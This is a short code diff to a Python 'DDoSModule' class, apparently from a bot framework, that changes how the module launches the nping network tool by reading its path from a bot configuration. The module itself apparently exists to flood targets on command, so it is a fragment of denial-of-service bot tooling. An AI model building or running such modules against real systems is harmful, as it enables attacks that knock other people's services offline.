@@ -6,12 +6,13 @@ Created on Dec 21, 2013
 
 from FeatureModule import FeatureModule
 import subprocess
+from domain import BotConfig
 
 class DDoSModule(FeatureModule):
     '''
     classdocs
     '''
-    __nping = None
+    __nping = None    
 
     def __init__(self):
         '''
@@ -20,7 +21,7 @@ class DDoSModule(FeatureModule):
         self.__name = "DDoS"
     
     def start(self, *args):
-        cline = ['nping']
+        cline = [BotConfig.NPING_PATH]
         cline = cline + args[0]
         self.__nping = subprocess.Popen(cline,
                              shell=False,
